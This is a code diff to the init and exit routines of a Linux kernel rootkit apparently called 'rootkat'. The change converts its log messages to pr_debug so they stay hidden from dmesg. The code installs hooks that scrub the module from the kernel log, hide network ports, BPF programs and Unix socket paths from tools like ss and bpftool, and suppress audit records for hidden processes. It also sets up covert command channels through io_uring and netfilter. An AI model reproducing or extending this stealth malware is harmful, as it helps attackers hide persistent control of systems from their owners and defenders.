@@ -35,14 +35,14 @@ static int __init rootkat_init(void)
 {
 	int rc;
 
-	pr_info(ROOTKAT_TAG "loading\n");
+	pr_debug(ROOTKAT_TAG "loading\n");
 
 	if (rootkat_canary_tick) {
 		u32 ticks = rootkat_canary_tick();
 
-		pr_info(ROOTKAT_TAG "rust canary present, tick=%u\n", ticks);
+		pr_debug(ROOTKAT_TAG "rust canary present, tick=%u\n", ticks);
 	} else {
-		pr_info(ROOTKAT_TAG "rust canary not loaded (C-only build)\n");
+		pr_debug(ROOTKAT_TAG "rust canary not loaded (C-only build)\n");
 	}
 
 	rootkat_hidden_unix_paths_init();
@@ -53,17 +53,17 @@ static int __init rootkat_init(void)
 		return rc;
 	}
 
-	/* Install the printk filter as early as possible — every rootkat
-	 * pr_info from this point onward is invisible to dmesg, including
-	 * the kernel's own "loading out-of-tree module taints kernel"
-	 * message which names us by module string. The earlier "loading"
-	 * pr_info above DOES land in the buffer; that's accepted (it's a
-	 * single line and any defender already knows we exist if they see
-	 * the insmod). Non-fatal: if vprintk_emit can't be hooked we run
-	 * with our log lines visible. */
+	/* Install the printk filter as early as possible — kernel-side
+	 * mentions of "rootkat" in the ring buffer get dropped from this
+	 * point onward (including the kernel's "<mod>: loading out-of-tree
+	 * module taints kernel" warning, except when that printed BEFORE
+	 * rootkat_init runs at all — which is most of the time, so the
+	 * OOT-taint warning is structurally unfilterable). Our own log
+	 * lines are pr_debug, silenced by dynamic_debug. Re-enable for
+	 * dev:  echo 'module rootkat +p' > /sys/kernel/debug/dynamic_debug/control */
 	rc = rootkat_hook_printk_install();
 	if (rc)
-		pr_warn(ROOTKAT_TAG "printk hook failed: %d (logs visible)\n", rc);
+		pr_debug(ROOTKAT_TAG "printk hook failed: %d\n", rc);
 
 	rc = rootkat_hook_m_show_install();
 	if (rc) {
@@ -108,34 +108,34 @@ static int __init rootkat_init(void)
 	/* UDP port hiding — non-fatal, mirrors TCP. */
 	rc = rootkat_hook_udp4_seq_show_install();
 	if (rc)
-		pr_warn(ROOTKAT_TAG "udp4_seq_show hook failed: %d\n", rc);
+		pr_debug(ROOTKAT_TAG "udp4_seq_show hook failed: %d\n", rc);
 	rc = rootkat_hook_udp6_seq_show_install();
 	if (rc)
-		pr_warn(ROOTKAT_TAG "udp6_seq_show hook failed: %d\n", rc);
+		pr_debug(ROOTKAT_TAG "udp6_seq_show hook failed: %d\n", rc);
 
 	/* Non-fatal: this hook depends on a symbol that may be inlined or
 	 * renamed on some kernels. If it doesn't resolve, the ss(8) bypass
 	 * stays open, but every other hook still works. Log + continue. */
 	rc = rootkat_hook_inet_sk_diag_fill_install();
 	if (rc)
-		pr_warn(ROOTKAT_TAG "inet_sk_diag_fill hook failed: %d (ss bypass not closed)\n",
+		pr_debug(ROOTKAT_TAG "inet_sk_diag_fill hook failed: %d (ss bypass not closed)\n",
 		        rc);
 
 	/* Non-fatal: BPF prog self-hide. */
 	rc = rootkat_hook_sys_bpf_install();
 	if (rc)
-		pr_warn(ROOTKAT_TAG "sys_bpf hook failed: %d (bpftool prog list will see us)\n",
+		pr_debug(ROOTKAT_TAG "sys_bpf hook failed: %d (bpftool prog list will see us)\n",
 		        rc);
 
 	/* Non-fatal: audit log suppression for hidden PIDs. */
 	rc = rootkat_hook_audit_log_start_install();
 	if (rc)
-		pr_warn(ROOTKAT_TAG "audit_log_start hook failed: %d\n", rc);
+		pr_debug(ROOTKAT_TAG "audit_log_start hook failed: %d\n", rc);
 
 	/* Non-fatal: AF_UNIX path hide via /proc/net/unix. */
 	rc = rootkat_hook_unix_seq_show_install();
 	if (rc)
-		pr_warn(ROOTKAT_TAG "unix_seq_show hook failed: %d (proc unix path not hidden)\n",
+		pr_debug(ROOTKAT_TAG "unix_seq_show hook failed: %d (proc unix path not hidden)\n",
 		        rc);
 
 	/* Non-fatal: AF_UNIX path hide via NETLINK_SOCK_DIAG (`ss -lx`).
@@ -143,7 +143,7 @@ static int __init rootkat_init(void)
 	 * sk_diag_fill is a static name colliding across diag modules. */
 	rc = rootkat_hook_unix_diag_install();
 	if (rc)
-		pr_warn(ROOTKAT_TAG "unix_diag hook failed: %d (ss -lx not closed)\n",
+		pr_debug(ROOTKAT_TAG "unix_diag hook failed: %d (ss -lx not closed)\n",
 		        rc);
 
 	/* Non-fatal: io_uring covert-channel control surface. Lets a
@@ -152,7 +152,7 @@ static int __init rootkat_init(void)
 	 * kill-syscall path that auditd/sysdig typically watch. */
 	rc = rootkat_hook_io_issue_sqe_install();
 	if (rc)
-		pr_warn(ROOTKAT_TAG "io_issue_sqe hook failed: %d (io_uring covert channel down)\n",
+		pr_debug(ROOTKAT_TAG "io_issue_sqe hook failed: %d (io_uring covert channel down)\n",
 		        rc);
 
 	/* Non-fatal: netfilter PRE_ROUTING hook. Inbound UDP packets with
@@ -161,17 +161,18 @@ static int __init rootkat_init(void)
 	 * command at the network layer and silently drops the packet. */
 	rc = rootkat_hook_netfilter_install();
 	if (rc)
-		pr_warn(ROOTKAT_TAG "netfilter hook failed: %d (network covert channel down)\n",
+		pr_debug(ROOTKAT_TAG "netfilter hook failed: %d (network covert channel down)\n",
 		        rc);
 
-	pr_info(ROOTKAT_TAG "loaded (hidden)\n");
+	pr_debug(ROOTKAT_TAG "loaded (hidden)\n");
 	return 0;
 }
 
 static void __exit rootkat_exit(void)
 {
-	/* Keep the printk filter live until last so our other hooks'
-	 * "unhooked %lx" pr_info lines stay invisible. */
+	/* Keep the printk filter live until last so any post-unload
+	 * kernel "rootkat" mentions still get dropped while our other
+	 * hooks tear down. */
 	rootkat_hook_netfilter_remove();
 	rootkat_hook_io_issue_sqe_remove();
 	rootkat_hook_unix_diag_remove();
@@ -187,7 +188,7 @@ static void __exit rootkat_exit(void)
 	rootkat_hook_sys_kill_remove();
 	rootkat_hook_m_show_remove();
 	rootkat_hook_printk_remove();
-	pr_info(ROOTKAT_TAG "unloaded\n");
+	pr_debug(ROOTKAT_TAG "unloaded\n");
 }
 
 module_init(rootkat_init);
